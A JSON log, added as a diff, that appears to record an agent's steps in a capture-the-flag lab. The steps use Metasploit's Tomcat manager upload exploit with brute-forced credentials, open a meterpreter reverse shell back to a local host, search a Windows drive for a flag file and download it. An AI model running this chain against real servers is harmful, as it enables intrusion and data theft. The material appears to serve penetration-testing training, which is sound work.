@@ -1,0 +1,44 @@
+[
+  {
+    "command": "msfconsole",
+    "reasoning": "Launch the Metasploit Framework console to exploit the Tomcat manager. Credentials (root:1234) were already obtained from the flag90b353 hydra brute-force.",
+    "output": "Metasploit console started",
+    "exit_code": null,
+    "agent": "flagcd699a"
+  },
+  {
+    "command": "use exploit/multi/http/tomcat_mgr_upload",
+    "reasoning": "Select the Tomcat Manager WAR upload exploit, which uses authenticated access to the Tomcat manager to deploy a malicious WAR file and get a shell.",
+    "output": "Exploit module loaded",
+    "exit_code": null,
+    "agent": "flagcd699a"
+  },
+  {
+    "command": "set RHOSTS 10.0.3.197\nset RPORT 8282\nset HttpUsername root\nset HttpPassword 1234\nset LHOST 192.168.0.8\nset payload java/meterpreter/reverse_tcp\nexploit",
+    "reasoning": "Configure the exploit with target host, port, Tomcat credentials, and local host for the reverse shell. Then run the exploit.",
+    "output": "Meterpreter session opened on 10.0.3.197",
+    "exit_code": null,
+    "agent": "flagcd699a"
+  },
+  {
+    "command": "shell",
+    "reasoning": "Drop from meterpreter into a native OS shell to run Windows commands directly.",
+    "output": "Windows command shell obtained on Tomcat server",
+    "exit_code": null,
+    "agent": "flagcd699a"
+  },
+  {
+    "command": "dir /s /b C:\\ | findstr /i \"cd699a\"",
+    "reasoning": "Recursively list all files on the C: drive in bare format and filter for the flag ID. Used because flag files have the flag hash in their filename.",
+    "output": "C:\\ProgramData\\Tomcat9\\flag{cd699a5719c85f42937554887f2c97f1cac37786abffa7}.jpg",
+    "exit_code": null,
+    "agent": "flagcd699a"
+  },
+  {
+    "command": "download \"C:\\\\ProgramData\\\\Tomcat9\\\\flag{cd699a5719c85f42937554887f2c97f1cac37786abffa7}.jpg\" /home/kali/Desktop/flag.jpg",
+    "reasoning": "Use meterpreter's download command to transfer the flag file from the Windows server to the local Kali machine.",
+    "output": "Flag JPG downloaded to /home/kali/Desktop/flag.jpg",
+    "exit_code": null,
+    "agent": "flagcd699a"
+  }
+]
